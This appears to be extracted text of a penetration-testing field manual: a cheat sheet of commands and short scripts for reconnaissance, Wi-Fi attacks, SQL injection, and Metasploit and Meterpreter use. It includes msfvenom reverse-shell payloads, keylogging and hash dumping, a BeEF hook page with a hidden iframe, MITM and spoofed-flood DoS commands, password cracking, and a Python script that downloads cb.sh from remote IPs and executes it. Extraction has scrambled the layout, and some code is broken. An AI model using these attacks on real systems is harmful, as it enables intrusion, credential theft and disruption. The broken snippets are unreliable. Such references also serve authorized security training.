#show interface
                                               Detailed interface info
<INTERFACE_NAME>
#show ip route                                        Routes
#show access-lists                            Access lists
#terminal length 0                        No limit on output
                                       Replace start config with
#copy running-config startup-config
                                            running config
                                         Backup the running
#copy running-config tftp             configuration to an external
                                             TFTP server
                          SNMP TOOLS
        snmpwalk -c public -v1
                                                 List Windows
        <IP_ADDRESS> 1 | grep
                                                running services
        hrSWRunName | cut -d" " –f4
        snmpwalk -c public -v1
                                               List Windows open
        <IP_ADDRESS> 1 | grep
                                                    TCP ports
        tcpConnState |cut -d" " -f6 |sort -u
        snmpwalk -c public -v1
                                                 List Windows
        <IP_ADDRESS> 1 | grep
                                               installed software
        hrSWInstalledName
        snmpwalk -c public -v1
        <IP_ADDRESS> 1.3 | grep                List Windows users
        77.1.2.25 | cut -d -f4


           DNSRECON & NMAP REVERSE
                     DNS
        dnsrecon.py -t rvl -r
                                               Reverse lookup
        <CIDR_IP_RANGE> -n
                                                 for IP range
        <DNS_IP_ADDRESS>
        dnsrecon.py –t std –d                 Retrieve standard
        <DOMAIN_NAME>                           DNS records
        dnsrecon.py –t brt –d                     Enumerate
        <DOMAIN_NAME> –D <HOSTS>                 subdomains
        dnsrecon.py –d <DOMAIN_NAME>              DNS zone
        –t axfr                                    transfer
        nmap –R –sL –Pn –dns-servers
        <DNS_SERVER_IP>
                                                Reverse DNS
        <IP_RANGE> | awk ‘{if(($1" "$2"
                                                 lookup and
        "$3)=="Nmap scan report")print$5"
                                                output parser
        "$6}’ | sed ‘s/(//g’ | sed ‘s/)//g’ >
        <OUTPUT_PATH>
More info at: https://github.com/darkoperator/dnsrecon
T
                         W
                  FREQUENCY CHART
125-134 kHz (LF)
13.56 MHz (HF)                                     RFID
433,860-930Mhz (UHF)
315 MHz (N. Am)
                                               Keyless Entry
433.92 MHz (Europe,Asia)
698-894 MHz
1710-1755 MHz
                                               Cellular (US)
1850-1910 MHz
2110-2155 MHz
1176.45 Mhz - L1 Band
1227.60 Mhz - L2 Band                              GPS
1575.42 MHz - L5 Band
1-2 GHz                                           L Band
868 MHz (Europe)
915 MHz (US,Australia)                       802.15.4 (ZigBee)
2.4 GHz (worldwide)
2.4-2.483.5 GHz                            802.15.1 (Bluetooth)
2.4 GHz                                         802.11b/g
5.0 GHz                                          802.11a
2.4/5.0 GHZ                                      802.11n
4-8 GHz                                          C Band
12-18 GHz                                       Ku Band
18-26.5 GHz                                      K Band
26.5-40 GHz                                     Ka Band


               HELPFUL RF WEBSITES
https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm FCC ID lookup
                                                           Frequency
http://www.radioreference.com/apps/db/
                                                            database
        KISMET COMMAND REFERENCE
e                               List Kismet servers
h                                       Help
z                             Toggle full-screen view
n                              Name current network
m                             Toggle muting of sound
i                      View detailed information for network
t                          Tag or untag selected network
s                                 Sort network list
g                             Group tagged networks
l                         Show wireless card power levels
u                             Ungroup current group
d                             Dump printable strings
c                         Show clients in current network
r                                Packet rate graph
L                     Lock channel hopping to selected channel
a                             View network statistics
H                        Return to normal channel hopping
p                                Dump packet type
+/-                           Expand/collapse groups
f                             Follow network center
CTRL+L                          Re-draw the screen
w                                   Track alerts
Q                                   Quit Kismet
x                              Close popup window
More info at:
http://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide
.pdf
                LINUX WI-FI COMMANDS
                                      Display wireless interface
iwconfig
                                             configuration
                                     List current state of wireless
rfkill list
                                                devices
rfkill unblock all                    Turn on wireless interface
airodump –ng
                                        Monitor all interfaces
<INTERFACE_NAME>
iwconfig ath0 essid <BSSID>

ifconfig ath0 up                     Connect to unsecured Wi-Fi

dhclient ath0
iwconfig ath0 essid <BSSID> key
<WEB_KEY>
                                    Connect to WEP Wi-Fi network
ifconfig ath0 up

dhclient ath0
iwconfig ath0 essid <BSSID>

ifconfig ath0 up
                                     Connect to WPA-PSK Wi-Fi
wpa_supplicant –B –i ath0 –c wpa-              network
psk.conf

dhclient ath0


                   LINUX BLUETOOTH
hciconfig <INTERFACE_NAME> up            Turn on Bluetooth interface
hcitool –i <INTERFACE_NAME> scan --
                                         Scan for Bluetooth devices
flush –all
sdptool browse <INTERFACE_NAME>              List open services
hciconfig <INTERFACE_NAME> name "            Set as discoverable
<BLUETOOTH_NAME>" class
0x520204
piscan
pand –K                   Clear pand sessions
              LINUX WI-FI TESTING
                                             Stop monitor mode
airmon-ng stop <INTERFACE_NAME>
                                                  interface
airmon-ng start <INTERFACE_NAME>
                                             Start monitor mode
iwconfig <INTERFACE_NAME> channel
                                                   interface
<CHANNEL>
airodump-ng –c <CHANNEL> --bssid <BSSID> –
                                               Capture traffic
w file <OUTPUT_PATH>
aireplay-ng -0 10 –a <BSSID> –c
                                             Force client de-auth
<VICTIM_MAC> <INTERFACE_NAME>
#WPA-PSK
aircrack-ng –w <WORDLIST_PATH>
<CAPTURED_HANDSHAKE_FILE_PATH>
                                                 Brute force
#EAP-MD5                                         handshake
eapmd5pass –r
<CAPTURED_HANDSHAKE_FILE_PATH> –w
<WORDLIST_PATH>


               WI-FI DOS ATTACKS
mdk3 <INTERFACE_NAME> a –a <BSSID>             Auth Flood
mdk3 <INTERFACE_NAME> b –c
                                              Beacon Flood
<CHANNEL>
                             W
               USER AGENT STRING
                   KEYWORDS
        Keywords found in user agent strings aid in identifying
                 the visiting operating system type.
      Mozilla/5.0 (iPhone; CPU iPhone
      OS 15_5 like Mac OS X)
                                              Keyword: iPhone
      AppleWebKit/605.1.15 (KHTML,
                                                Apple iPhone
      like Gecko) CriOS/102.0.5005.87
      Mobile/15E148 Safari/604.1
      Mozilla/5.0 (Linux; Android 12;
      SM-A205U) AppleWebKit/537.36                Keyword:
      (KHTML, like Gecko)                        Android 12
      Chrome/102.0.5005.78 Mobile              Android Phone
      Safari/537.36
                                                  Keyword:
      Mozilla/5.0 (Windows NT 10.0;
                                                Windows NT
      Win64; x64) AppleWebKit/537.36
                                                     10.0
      (KHTML, like Gecko)
                                                  Windows
      Chrome/102.0.5005.63 Safari/537.36
                                                  Computer
      Mozilla/5.0 (Macintosh; Intel Mac           Keyword:
      OS X 12_4) AppleWebKit/537.36              Macintosh
      (KHTML, like Gecko)                          Mac OS
      Chrome/102.0.5005.63 Safari/537.36          Computer


       HTML BEEF HOOK TECHNIQUE
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN">

<html>
<head>
<title><WEBSITE_TITLE></title>
<script>
var commandModuleStr = '<script src="' + window.location.protocol + '//'
+ window.location.host + ':<PORT>/<URI_TO_HOOK.JS> "
type="text/javascript"><\/script>';
document.write(commandModuleStr);
</script>

</head>
<WEBSITE_CONTENT>
</html>
                    EMBEDDED IFRAME
<iframe src="<URI/URL>" width="0" height="0" frameborder="0"
tabindex="-1" title="empty" style=visibility:hidden;display:none"> </iframe>

            FIREFOX TYPE CONVERSIONS
javascript:btoa("<ASCII_STRING>")                    ASCII -> Base64
javascript:atob("<BASE64>")                          Base64 -> ASCII
javascript:encodeURI("<ASCII_STRING>")                ASCII -> URI
javascript:decodeURI("<ENCODED_URI>")                 URI -> ASCII


         WGET CAPTURE SESSION TOKEN
wget –q –-save-cookies=<OUTPUT_PATH> –-keep-session-cookies –-post-
data="username:<USERNAME>&password=<PASSWORD>&Login=Login"
<LOGIN_URL>

                                 CURL
                                                                     Grab
curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01;             headers
Windows NT 5.0)" <URL>                                            and spoof
                                                                  user agent
                                                                    Scrape
curl -u <USERNAME>:<PASSWORD> -o <OUTPUT_FILE>
                                                                   site after
<URL>
                                                                     login
curl ftp://<USERNAME>:
                                                                     FTP
<PASSWORD>@<URL>/<DIRECTORY>
                                                                  Sequential
curl http://<URL>/<FILE_PATH>[1-10].txt
                                                                   lookup
       AUTOMATED WEB SCREENSHOTS
              (WITNESSME)
 WitnessMe is a tool that takes screenshots of webpages using Pyppeteer.
apt-get update                                       Update packages
apt-get install docker.io                             Install Docker
docker pull byt3bl33d3r/witnessme                       Installation
docker images                                          Get image ID
                                                  Run docker container
docker run -it --entrypoint=/bin/sh -v           mounting /transfer to the
$(pwd):/transfer <IMAGE_ID>                      current directory on the
                                                       host machine
witnessme screenshot <IP_CIDR> -p
                                                  Run and execute scan
<PORT>,<PORT>
cd <FILE_PATH>                                  cd into created scan folder
                                                 Copy screenshotted files
cp *.png /transfer/                               back to host machine
                                                current working directory
More info at: https://github.com/byt3bl33d3r/WitnessMe

                              SQLMAP
sqlmap.py –u "http://<URL>?id=1&str=val"             GET request
sqlmap.py –u "http://<URL>" –-data="id=1&str=val"   POST request
                                                    SQL injection
sqlmap.py –u "http://<URL>" –-data="id=1&str=val"
                                                   against specific
–p "id"
                                                   parameter with
–b –-dbms="<mssql|mysql|oracle|postgres>"
                                                  DB type specified
Login and note cookie value (cookie1=val1,
cookie2=val2)
                                                  SQL injection on
sqlmap.py –u "http://<URL>" –-data="id=1&str=val" authenticated site
–p "id"
–-cookie="cookie1=val1;cookie2=val2"
sqlmap.py –u "http://<URL>" –-data="id=1&str=val"   SQL injection
–p "id" –b –-current-db –-current-user               and collect DB
                                                     version, name,
                                                        and user
                                                     SQL injection
sqlmap.py –u "http://<URL>" –-data="id=1&str=val"
                                                    and get tables of
–p "id" --tables –D "testdb"
                                                       DB=testdb
                                                     SQL injection
sqlmap.py –u "http://<URL>" –-data="id=1&str=val"
                                                    and get columns
–p "id" --columns –T "users"
                                                      of user table
                    D
                        MSSQL
SELECT @@version                             DB version
EXEC xp_msver                            Detailed version info
EXEC master..xp_cmdshell 'net user‘       Run OS command
SELECT HOST_NAME()                         Hostname & IP
SELECT DB_NAME()                             Current DB
SELECT name FROM master..sysdatabases;         List DBs
SELECT user_name()                           Current user
SELECT name FROM master..syslogins            List users
SELECT name FROM master..sysobjects
                                               List tables
WHERE xtype=’U’;
SELECT name FROM syscolumns WHERE id=
(SELECT id FROM sysobjects WHERE             List columns
name=‘mytable’);
                                             System table
SELECT TOP 1 TABLE_NAME FROM
                                         containing info on all
INFORMATION_SCHEMA.TABLES
                                                 tables
SELECT name FROM syscolumns WHERE id
= (SELECT id FROM sysobjects WHERE       List all tables/columns
name = 'mytable')
SELECT name, password_hash FROM            Password hashes
master.sys.sql_logins                          (2005)

                     POSTGRES
SELECT version();                              DB version
SELECT inet_server_addr()                     Hostname & IP
SELECT current_database();                     Current DB
SELECT datname FROM pg_database;                List DBs
SELECT user;                                   Current user
SELECT username FROM pg_user;                   List users
SELECT username,passwd FROM pg_shadow         List password
                                                  hashes
SELECT relname, A.attname FROM pg_class C,
pg_namespace N, pg_attribute A, pg_type T
WHERE (C.relkind=’r') AND
(N.oid=C.relnamespace) AND (A.attrelid=C.oid)   List columns
AND (A.atttypid=T.oid) AND (A.attnum>0) AND
(NOT A.attisdropped) AND (N.nspname ILIKE
‘public’)
SELECT c.relname FROM pg_catalog.pg_class c
LEFT JOIN pg_catalog.pg_namespace n ON n.oid
= c.relnamespace WHERE c.relkind IN (‘r’,")
                                                 List tables
AND n.nspname NOT IN (‘pg_catalog’,
‘pg_toast’) AND
pg_catalog.pg_table_is_visible(c.oid)
                           MYSQL
SELECT @@version;                            DB version
SELECT @@hostname;                          Hostname & IP
SELECT database();                           Current DB
SELECT distinct(db) FROM mysql.db;            List DBs
SELECT user();                               Current user
SELECT user FROM mysql.user;                  List users
SELECT host,user,password FROM
                                         List password hashes
mysql.user;
SELECT table_schema, table_name,
column_name FROM
information_schema.columns WHERE        List all tables & columns
  table_schema != 'mysql' AND
table_schema != 'information_schema'


                          ORACLE
SELECT * FROM v$version;                      DB version
SELECT version FROM v$instance;               DB version
SELECT instance_name FROM v$instance;         Current DB
SELECT name FROM v$database;                  Current DB
SELECT DISTINCT owner FROM
                                                List DBs
all_tables;
SELECT user FROM dual;                        Current user
SELECT username FROM all_users
                                               List users
ORDER BY username;
SELECT column_name FROM
                                              List columns
all_tab_columns;
SELECT table_name FROM all_tables;             List tables
SELECT name, password, astatus FROM
                                         List password hashes
sys.user$;
SELECT DISTINCT grantee FROM
dba_sys_privs WHERE ADMIN_OPTION =             List DBAs
'YES';
T
                    N
                SCAN TYPES
-sn                             Ping scan
-sS                              Syn scan
-sT                           Connect scan
-sU                             UDP scan
-sO                          IP protocol scan


              SCAN OPTIONS
-p <PORT_RANGES>                    Ports
                        Speed presets: 0 Slowest, 5
-T[0-5]
                                   fastest
-n                          No DNS resolution
-O                             OS Detection
-A                           Aggressive Scan
-sV                      Service/Version detection
-Pn                         No ping nmap scan
-6                              IPv6 Scan
                         Randomizes target hosts
--randomize-hosts       (will not scan each host in
                                sequence)
--traceroute            Run traceroute against host
--ttl <TTL_VALUE>                 Set TTL
--script
                        Execute script against host
<SCRIPT_NAME>
--script-args
                           Set script arguments
<ARGUMENTS>


      OUTPUT/INPUT OPTIONS
-oX <FILE_PATH>             Write to XML file
   -oG <FILE_PATH>        Write to grep file
   -oA <FILE_PATH>      Save as all 3 formats
   -iL <FILE_PATH>     Read hosts/IPs from file
   --excludefile
                        Excludes hosts in file
   <FILE_PATH>


             FIREWALL EVASION
-f                            Fragment packets
-S <IP_ADDRESS>                Spoof source IP
-g <PORT>                     Spoof source port
-D <IP_ADDRESS>,
                              Scan with decoys
<IP_ADDRESS>
--mtu <MTU>                     Set MTU size
--spoof-mac <MAC>            Spoof MAC address
--data-length <SIZE>         Append random data
--scan-delay <TIME>              Scan delay
               MISC FLAGS
xsltproc                            Convert Nmap
<INPUT_NMAP_XML>.xml –o              XML file to
<OUTPUT_PATH>.html                     HTML
nmap –sP –n –oX out.xml
                                   Generate live host
<IP_CIDR> | grep "Nmap" | cut –d
                                         file
" " –f 5 > <OUTPUT_PATH>.txt
ndiff <FILE_PATH1>.xml              Compare Nmap
<FILE_PATH2>.xml                        results
                                     DNS reverse
nmap –R –sL –dns-server
                                     lookup on IP
<DNS_SERVER_IP> <IP_CIDR>
                                         range
                             W
           WIRESHARK FILTER OPTIONS
eth.addr, eth.dst, eth.src                              MAC filter
rip.auth.passwd                                        RIP password
ip.addr, ip.dst, ip.src
                                                            IP
ipv6.addr, ipv6.dst, ipv6.src
tcp.port, tcp.dstport, tcp.srcport                      TCP ports
tcp.flags.ack, tcp.flags.fin, tcp.flags.push,
                                                         TCP flags
tcp.flags.reset, tcp.flags.syn, tcp.flags.urg
udp.port, udp.dstport, udp.srcport                       UDP ports
http.authbasic                                      Basic authentication
http.www_authenticate                              HTTP authentication
http.file_data                                      HTTP data portion
http.cookie                                            HTTP cookie
http.referer                                           HTTP referer
http.server                                            HTTP Server
http.user_agent                                   HTTP user agent string
wlan.fc.type eq 0                                802.11 management frame
wlan.fc.type eq 1                                  802.11 control frame
wlan.fc.type_subtype eq 20                           802.11 data frame
wlan.fc.type_subtype eq 0 (1=response)           802.11 association request
wlan.fc.type_subtype eq 2 (3=response)          802.11 reassociation request
wlan.fc.type_subtype eq 4 (5=response)             802.11 probe request
wlan.fc.type_subtype eq 8                             802.11 beacon
wlan.fc.type_subtype eq 10                          802.11 disassociate
wlan.fc.type_subtype eq 11
                                                    802.11 authenticate
(12=deauthenticate)
              COMPARISON OPERATORS
           equals                       eq        =
           not equals                   ne        !=
           greater than                 gt        >
           less than                    lt        <
           greater than or equal to     ge        >=
           Less than or equal to        le        <=


                     LOGICAL OPERATORS
           and                               &&
           or                                ||
           xor                               ^^
           not                               !


                 WIRESHARK EXAMPLES
 ip.addr == 10.10.50.1                            Wireshark Filter by IP
 ip.dst == 10.10.50.1                             Filter by Destination IP
 ip.addr >= 10.10.50.1 and
                                                       Filter by IP range
 ip.addr <=10.10.50.100
 !(ip.addr == 10.10.50.1)                           Filter out IP address
 tcp.port == 25                                         Filter by port
                                                    Filter by destination
 tcp.dstport == 23
                                                              port
 ip.addr == 10.10.50.1 and                        Filter by IP address and
 tcp.port == 25                                               port
 tcp.flags.syn == 1 and tcp.flags.ack == 0             Filter SYN flag
 eth.addr == 00:70:f4:23:18:c4                      MAC address filter
More info at: https://www.stationx.net/wireshark-cheat-sheet/
                       N
               NETCAT EXAMPLES
nc <IP_ADDRESS> <PORT>                     Connect to target
nc –lvp <PORT>                              Start listener
nc –v –n –z –w1 <IP_ADDRESS>
                                             Port scanner
<START_PORT>-<END_PORT>

               DOWNLOAD A FILE
nc –l –p <PORT> < <FILE_PATH>    Start listener and stage file
nc –w3 <IP_ADDRESS> <PORT> >
                                Connect to IP and retrieve file
<FILE_PATH>

                  UPLOAD A FILE
nc –l –p <PORT> > <FILE_PATH>
                                  Start listener and set path
nc –w3 <IP_ADDRESS> <PORT> <
                                    Connect and push file
<FILE_PATH>
                       M
                 METASPLOIT OPTIONS
                                 Launch Metasploit and load
msfconsole –r <FILE_PATH>.rc
                                         resource file
show exploits                          Display exploits
show auxiliary                    Display auxiliary modules
show payloads                          Display payloads
                                 Searches module names and
search <SEARCH_STRING>
                                         descriptions
info <MODULE>                     Show module information
use <MODULE>                       Load exploit or module
show options                       Display module options
                                  Display advanced module
show advanced
                                            options
                                    Configure framework
set <OPTION> <VALUE>
                                      options/parameters
sessions -v                        List Metasploit sessions
sessions -k <ID>                  Kill Metasploit session ID
                                 Run Meterpreter script on all
sessions –s <SCRIPT>
                                            sessions
jobs -l                                   List all jobs
jobs -k <ID>                           Kill given job ID
                                  Run exploit as background
exploit -j
                                               job
route add <IP_ADDRESS>
                                           Pivoting
<NETMASK> <SESSION_ID>
                                  Load 3rd party modules or
loadpath <FILE_PATH>
                                          exploits
irb                              Live Ruby interpreter shell
                                 SSL connect (Acts similarly
connect -s <IP_ADDRESS> <PORT>
                                         to Netcat)
use exploit/multi/handler                 Advanced option allows for
                                               multiple shells
set ExitOnSession False
set ConsoleLogging true
                                               Enables logging
set SessionLogging true
More info at: https://cdn.comparitech.com/wp-
content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp
          CREATE & CATCH PAYLOADS
                (MSFVENOM)
msfvenom --list encoders                     List available encoders
msfvenom --list payloads                     List available payloads
msfvenom -p windows/meterpreter/reverse_tcp     Created encoded
LHOST=<IP_ADDRESS> LPORT=<PORT> Meterpreter reverse TCP
-e x86/shikata_ga_nai -i 3 -a x86 -f exe >    payload for Windows
encoded.exe                                          systems
msfvenom -p
                                               Created Meterpreter
linux/x86/meterpreter/reverse_tcp LHOST=
                                            reverse TCP payload for
<IP_ADDRESS> LPORT=<PORT> -f elf >
                                                  Linux systems
reverse.elf
use multi/handler
                                                Start Meterpreter
                                                     listener
set payload windows/meterpreter/reverse_tcp
                   START MSF DB (KALI)
service postgresql start
                                                Start MSF (Kali)
msfconsole


           METERPRETER PASS A SHELL
 By default, this module will create a notepad.exe process and inject into
                                     it.
                                                                     Use
use post/windows/manage/multi_meterpreter_inject
                                                                   module
                                                                     Set
                                                                  target IP
                                                                   address
set IPLIST <IP_ADDRESS>
                                                                   to pass
                                                                  the shell
                                                                      to
                                                                   Set the
set LPORT <PORT>                                                    target
                                                                     port
                                                                   Set the
                                                                   session
                                                                 ID to run
set SESSION <SESSION_ID>
                                                                     this
                                                                   module
                                                                   against
                                                                  Run the
exploit
                                                                   module
             METERPRETER COMMANDS
help                                     List available commands
sysinfo                                     Display system info
ps                                              List processes
getpid                                        List current PID
upload <LOCAL_PATH>                     Upload a file to C:\Program
C:\\Program\ Files\\test.exe                   Files\binary.exe
download <FILE_PATH>                            Download file
                                           Interact with registry
reg <COMMAND>
                                       (reg by itself will list syntax)
rev2self                                   Revert to original user
shell                                     Drop to interactive shell
migrate <PID>                             Migrate to another PID
background                              Background current session
keyscan_start                                  Start keylogger
keyscan_stop                                   Stop keylogger
keyscan_dump                                  Dump keylogger
execute –f cmd.exe –i                  Execute cmd.exe and interact
                                  Execute cmd.exe as hidden process and
execute –f cmd.exe –i –H -t
                                               with all tokens
hashdump                                    Dumps local hashes
run <SCRIPT>                       Executes script (/scripts/meterpreter)
                                   Create a rule to open port 443 on the
portfwd add –L 127.0.0.1 –l
                                  attack machine and forward it through
443 –r 3.3.3.3 –p 3389
                                 the session to target 3.3.3.3 on port 3389
                                  Delete the rule to open port 443 on the
portfwd delete –L 127.0.0.1 –l
                                  attack machine and forward it through
443 –r 3.3.3.3 –p 3389
                                 the session to target 3.3.3.3 on port 3389
                                    Background session to interact with
background
                                                 msfconsole
getuid                                   List current session owner
steal_token <PID>                 Steal authentication token from process
screengrab                       Run plugin to capture screenshot of user
session
 NMAP THROUGH METERPRETER SOCKS
             PROXY
sessions                          Take note of the Meterpreter ID
route add 3.3.3.0 255.255.255.0    Add a route through the target
<SESSION_ID>                                    host
use auxiliary/server/socks4a           Setup socks4a server
                                  Run socks4a server (defaults to
run
                                             port 1080)
                                  Edit /etc/proxychains.conf and
socks4 127.0.0.1 1080                 update with port 1080

                                   Run Nmap scan against 3.3.3.3
                                  targeting ports 80, 135, and 445.
proxychains nmap –sT –Pn -n –p
                                      This scan will be tunneled
80,135,445 3.3.3.3
                                    through the Metasploit victim
                                                 host
                            E
                 ETTERCAP COMMANDS
                                          Man-in-the-Middle with filter
ettercap.exe –i <INTERFACE> –
M arp –Tq –F file.ef
                                        <MAC>/<IP>/<PORTS> Example:
<MACs>/<IPs>/<PORTs>
                                         //80,443 = any MACs, any IPs,
<MACs>/<IPs>/<PORTs>
                                                ports 80 and 443
                                         Man-in-the-Middle entire subnet
ettercap –T –M arp –F filter.ef // //
                                                with applied filter
ettercap –TP rand_flood                           Switch flood


                      ETTERCAP FILTER
                                                               Compile
etterfilter <ETTER_FILTER> –o out.ef                           Ettercap
                                                                filter
if (ip.proto == UDP && udp.dst == 500){
  drop();
   kill(); }
if (ip.src == ‘<ip>’){
                                                             Sample filter
  if (tcp.dst == 80){
                                                              - kills VPN
    if (search(DATA.data, "Accept-Encoding")){
                                                               traffic and
      replace("Accept-Encoding","Accept-Rubbish!");
                                                                 decodes
      msg("Replaced Encoding\n");
                                                             HTTP traffic
    }
  }
}



                                HPING3
hping3 <TARGETIP> --flood –-
frag –-spoof <IP> --destport                 DoS from spoofed IPs
<PORT> --syn
                         ARPING
arping <IP_ADDRESS> -I
<INTERFACE_NAME> -c               ARP scanner
<NUMBER_OF_ARPS>
              P                      C
                              HYDRA
hydra -t 1 -l admin -P
                                        Brute force the username admin
<PASSWORD_LIST_PATH> -v
                                         with the given password list
ftp://<IP_ADDRESS> ftp
hydra -v -u -L
                                        Brute force SSH with user and
<USER_LIST_PATH> -P
                                        password lists against target IP
<PASSWORD_LIST_PATH> -t 1
                                                   address
ssh://<IP_ADDRESS>


                     JOHN THE RIPPER
john --wordlist=<WORD_LIST_PATH>
                                              Cracking with a wordlist
<HASH_LIST_FILE>
                                              Attempt to crack hash file
john --loopback <HASH_LIST_FILE>              using previously cracked
                                                      passwords
john --show <HASH_LIST_FILE>                  Show cracked passwords
                                             Attempt to crack hash using
john --incremental <HASH_LIST_FILE>            incremental mode (May
                                                   take a long time)
Note: If running on Kali check out /usr/share/wordlists for rockyou and
other common password cracking wordlists.
  CRACK EXCEL PASSWORD PROTECTED
            DOCUMENT
python office2john.py              Run office2john.py against password
<INPUT_PATH> >                     protected Excel file to extract
extractedHash.txt                  crackable hash from office document
9400-MS Office 2007

9500-MS Office 2010

9600-MS Office 2013

25300-MS Office 2016
SheetProtection

9700-MS Office <= 2003 $0/$1,
MD5 + RC4                          Determine office/hash version based
                                   on contents of extractedHash.txt
9710-MS Office <= 2003 $0/$1,
MD5 + RC4, collider #1             (Listed in the output hash file from
                                   office2john... integer code on right
9720-MS Office <= 2003 $0/$1,      goes into hashcat)
MD5 + RC4, collider #2

9810-MS Office <= 2003 $3,
SHA1 + RC4, collider #1

9820-MS Office <= 2003
$3,SHA1+RC4, collider #2

9800-MS Office <= 2003 $3/$4,
SHA1 + RC4
hashcat64 -a 0 -m <MODE> --
username -o cracked.txt            Run hashcat command to crack
extractedHash.txt                  extracted and edited hash
/usr/share/wordlists/rockyou.txt
P
            ASCII   R
           REGEX EXPRESSIONS
^                           Start of string
*                             0 or more
+                             1 or more
?                               0 or 1
.                          Any char but \n
{3}                           Exactly 3
{3,}                          3 or more
{3,5}                           3 to 5
{3|5}                           3 or 5
[345]                         3 or 4 or 5
[^34]                         Not 3 or 4
[a-z]                       Lowercase a-z
[A-Z]                      Uppercase A-Z
[0-9]                          Digit 0-9
\d                               Digit
\D                             Not digit
\w                           A-Z,a-z,0-9
\W                         Not A-Z,a-z,0-9
\s                      White Space (\t\r\n\f)
\S                           Not (\t\r\n\f)
reg[ex]                    "rege" or "regx"
regex?                    "rege" or "regex"
regex*                  "rege" w/ 0 or more x
regex+                  "rege" w/ 1 or more x
[Rr]egex                 "Regex" or "regex"
\d{3}                      Exactly 3 digits
\d{3,}                     3 or more digits
[aeiou]                      Any 1 vowel
(0[3-9]|1[0-9]|2[0-5])   Numbers 03-25
ASCII T

HEX ASCII
x00   NUL
x08    BS
x09   TAB
x0a    LF
x0d    CR
x1b   ESC
x20   SPC
x21     !
x22     “
x23     #
x24     $
x25    %
x26    &
x27     ‘
x28     (
x29     )
x2a     *
x2b     +
x2c     ,
x2d     -
x2e     .
x2f     /
x30     0
x31     1
x32     2
x33     3
x34     4
x35     5
x36     6
x37   7
x38   8
x39   9
x3a   :

HEX ASCII
x3b   ;
x3c   <
x3d   =
x3e   >
x3f   ?
x40   @
x41   A
x42   B
x43   C
x44   D
x45   E
x46   F
x47   G
x48   H
x49   I
x4a   J
x4b   K
x4c   L
x4d   M
x4e   N
x4f   O
x50   P
x51   Q
x52   R
x53   S
x54   T
x55   U
x56   V
x57   W
x58   X
x59   Y
x5a   Z
x5b   [

HEX ASCII
x5c   \
x5d   ]
x5e   ^
x5f   _
x60   `
x61   a
x62   b
x63   c
x64   d
x65   e
x66   f
x67   g
x68   h
x69   i
x6    j
x6b   k
x6c   l
x6d   m
x6e   n
x6f   o
x70   p
x71   q
x72   r
x73   s
x74   t
x75   u
x76   v
x77   w
x78   x
x79   y
x7a   z
                             P
               PYTHON PORT SCANNER
import socket as sk
for port in range(<START_PORT>,<END_PORT>):
 try:
    s=sk.socket(sk.AF_INET,sk.SOCK_STREAM)
    s.settimeout(1000)
    s.connect(('<IP_ADDRESS>',port))
    print ('%d:OPEN' % (port))
    s.close
 except: continue

            PYTHON BASE64 WORDLIST
#!/usr/bin/python
import base64

file1=open("<PLAINTEXT_FILE_PATH>","r")
file2=open("<ENCODED_FILE_PATH>","w")

for line in file1:
 clear = "administrator:" + str.strip(line)
 new = base64.b64encode(clear.encode())
 file2.write(new.decode())

    CONVERT WINDOWS REGISTRY HEX
      FORMAT TO READABLE ASCII
import sys, string
dataFormatHex = bytearray.fromhex(sys.argv[1]).decode()
output = ""
for char in dataFormatHex:
 if char in string.printable:
   output += char
 else:
  output += "."

print("\n" + output)

  READ ALL FILES IN FOLDER & SEARCH
              FOR REGEX
import glob, re

for msg in glob.glob('/tmp/.txt'):
 filer = open((msg),'r')
 data = filer.read()
 message = re.findall(r'<message>(.?)>/message>', data,re.DOTALL)
 print("File %s contains %s" % (str(msg),message))
 filer.close()
   SSL ENCRYPTED SIMPLEHTTPSERVER
# Create SSL cert (follow prompts for customization)
# openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 –
nodes

# Create httpserver.py
import http.server, ssl, socketserver

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain("cert.pem")

server_address = ('localhost', 4443)

handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(server_address, handler) as httpd:
  httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
  httpd.serve_forever()

    LOOP THROUGH IP LIST, DOWNLOAD
       FILE OVER HTTP & EXECUTE
#!/usr/bin/python

import os
from urllib.request import urlopen

urls = ["<IP_ADDRESS1>","<IP_ADDRESS2>"]
port = "<PORT_TO_CONNECT>"
payload = "cb.sh"

for url in urls:
 u = "http://%s:%s/%s" % (url, port, payload)
 try:
   r = urlopen(u)
   wfile = open("/tmp/cb.sh","wb")
  wfile.write(r.read())
  wfile.close()
  break

 except: continue

if os.path.exists("/tmp/cb.sh"):
  os.system("chmod 700 /tmp/cb.sh")
  os.system("/tmp/cb.sh")
     PYTHON EMAIL SENDER (SENDMAIL
          MUST BE INSTALLED)
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

server = smtplib.SMTP('<SMTP_SERVER>', <PORT>)

server.ehlo()

with open('<FILE_PATH>', 'r') as f:
  password = f.read()

server.login('<EMAIL>', password)

msg = MIMEMultipart()
msg['From'] = '<FROM_EMAIL>'
msg['To'] = '<TO_EMAIL>'
msg['Subject'] = '<SUBJECT_LINE>'

with open('<FILE_PATH>', 'r') as f:
  message = f.read()

msg.attach(MIMEText(message, 'plain'))

text = msg.as_string()
server.sendmail('<FROM_EMAIL>', '<TO_EMAIL>', text)

       GENERATE RANDOM STRING OF N
                 LENGTH
import string, random

n=10
randstr = "".join(random.choice(string.ascii_letters + string.digits) for n in
range(n))

print (randstr)

                  PYTHON HTTP SERVER
python –m SimpleHTTPServer <PORT>
         CUSTOM PYTHON HTTP BANNER
                  GRABBER
#!/usr/bin/python
#Sample syntax: python test.py -t 127.0.0.1-2 -p 8000 -d 1

import sys, time
from urllib.request import urlopen
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-t", dest="iprange",help="target IP range, i.e.
192.168.1.1-25")
parser.add_option("-p", dest="port",default="80",help="port,
default=80")
parser.add_option("-d", dest="delay",default=".5",help="delay (in
seconds), default=.5 seconds")

(opts, args) = parser.parse_args()

if opts.iprange is None:
  parser.error("you must supply an IP range")

ips = []
headers = {}
octets = opts.iprange.split('.')
start = octets[3].split('-')[0]
stop = octets[3].split('-')[1]

for i in range(int(start),int(stop)+1):
